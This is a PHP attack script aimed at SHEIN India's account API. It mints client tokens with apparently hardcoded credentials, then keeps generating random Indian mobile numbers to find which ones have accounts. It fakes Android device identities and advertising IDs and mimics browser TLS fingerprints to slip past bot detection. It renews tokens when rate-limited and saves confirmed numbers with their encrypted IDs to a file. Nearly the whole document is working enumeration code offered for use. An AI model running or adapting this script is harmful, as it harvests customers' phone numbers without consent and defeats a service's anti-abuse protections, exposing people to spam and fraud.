<?php
error_reporting(0);
ini_set('memory_limit', '512M');

$green  = "\033[1;32m";
$red    = "\033[1;31m";
$cyan   = "\033[1;36m";
$yellow = "\033[1;33m";
$reset  = "\033[0m";

echo $cyan . "
  _______ _    _ _____  ____   ____  
 |__   __| |  | |  __ \|  _ \ / __ \ 
    | |  | |  | | |__) | |_) | |  | |
    | |  | |  | |  _  /|  _ <| |  | |
    | |  | |__| | | \ \| |_) | |__| |
    |_|   \____/|_|  \_\____/ \____/ 
       V21: PURE PHP STEALTH HANDSHAKE
" . $reset . PHP_EOL;

function getRandomDevice() {
    $brands = [['Samsung', 'SM-S911B'], ['OnePlus', 'CPH2449'], ['Google', 'Pixel 8']];
    $brand = $brands[array_rand($brands)];
    $ver = rand(12, 14);
    $api = rand(31, 34);
    return [
        'ua' => "SHEIN/1.0.8 (Linux; Android $ver; {$brand[1]} Build/".strtoupper(substr(md5(microtime()), 0, 8)).")",
        'api' => "Android/$api"
    ];
}

function genAdId() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function httpCall($url, $data, $headers) {
    $ch = curl_init();
    
    // Modern Browser Cipher Suite (JA3 Signature Fix)
    $ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384";

    $options = [
        CURLOPT_URL => $url,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_POST => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_ENCODING => "gzip, deflate",
        // FORCING CORRECT HANDSHAKE
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0,      // Use HTTP/2 (Crucial)
        CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_3,       // Use TLS 1.3
        CURLOPT_SSL_CIPHER_LIST => $ciphers,                // Browser Ciphers
        CURLOPT_TCP_KEEPALIVE => 1,
        CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4
    ];

    curl_setopt_array($ch, $options);
    $out = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    if (curl_errno($ch)) {
        $error = curl_error($ch);
        curl_close($ch);
        return ['body' => "Error: $error", 'code' => 0];
    }
    
    curl_close($ch);
    return ['body' => $out, 'code' => $code];
}

function getToken() {
    $dev = getRandomDevice();
    $url = "https://api.services.sheinindia.in/uaas/jwt/token/client";
    $h = [
        "User-Agent: " . $dev['ua'],
        "Client_type: " . $dev['api'],
        "X-Tenant-Id: SHEIN",
        "Content-Type: application/x-www-form-urlencoded",
        "Accept: application/json"
    ];
    $r = httpCall($url, "grantType=client_credentials&clientName=trusted_client&clientSecret=secret", $h);
    $res = json_decode($r['body'], true);
    return $res['access_token'] ?? null;
}

$total = 0; $hits = 0;
$token = getToken();

if (!$token) {
    die($red . "[-] Handshake Blocked. Your server libcurl might be outdated." . $reset . PHP_EOL);
}

echo $green . "[!] Handshake Success. Scrapper Running..." . $reset . PHP_EOL;

while (true) {
    $total++;

    if ($total % 40 == 0) {
        $token = getToken();
    }

    $mobile = ['99','98','97','96','93','90','88','89','87','70','79','78','63','62'][rand(0,13)] . rand(10000000, 99999999);
    $dev = getRandomDevice();
    $adId = genAdId();

    $headers = [
        "Authorization: Bearer $token",
        "User-Agent: " . $dev['ua'],
        "Client_type: " . $dev['api'],
        "Ad_id: $adId",
        "X-Tenant-Id: SHEIN",
        "Content-Type: application/x-www-form-urlencoded"
    ];

    $res = httpCall("https://api.services.sheinindia.in/uaas/accountCheck", "mobileNumber=$mobile", $headers);
    $json = json_decode($res['body'], true);

    if (isset($json['encryptedId']) && !empty($json['encryptedId'])) {
        $hits++;
        echo "\r" . str_repeat(" ", 70) . "\r"; 
        echo $green . "[HIT] $mobile | HITS: $hits | TOTAL: $total" . $reset . PHP_EOL;
        file_put_contents("valid.txt", "$mobile | " . $json['encryptedId'] . PHP_EOL, FILE_APPEND);
    } else {
        echo $red . "[BAD] $mobile | TOTAL: $total\r" . $reset;
        if ($res['code'] == 429 || $res['code'] == 403) {
            $token = getToken();
            usleep(500000);
        }
    }
    usleep(0.1); 
}
